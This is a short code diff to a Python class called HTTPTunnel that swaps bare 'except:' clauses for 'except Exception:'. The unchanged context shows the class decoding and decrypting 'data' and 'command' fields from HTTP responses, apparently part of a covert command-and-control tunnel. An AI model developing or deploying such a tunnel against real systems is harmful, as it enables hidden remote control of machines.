@@ -480,7 +480,7 @@ class HTTPTunnel:
                     if "data" in resp_data:
                         decrypted = self._encrypt(self._decode(resp_data["data"]))
                         return decrypted.decode()
-                except:
+                except Exception:
                     pass
 
                 return response.text[:1000]
@@ -517,7 +517,7 @@ class HTTPTunnel:
                     if "command" in data:
                         decrypted = self._encrypt(self._decode(data["command"]))
                         return decrypted.decode()
-                except:
+                except Exception:
                     pass
 
             return None
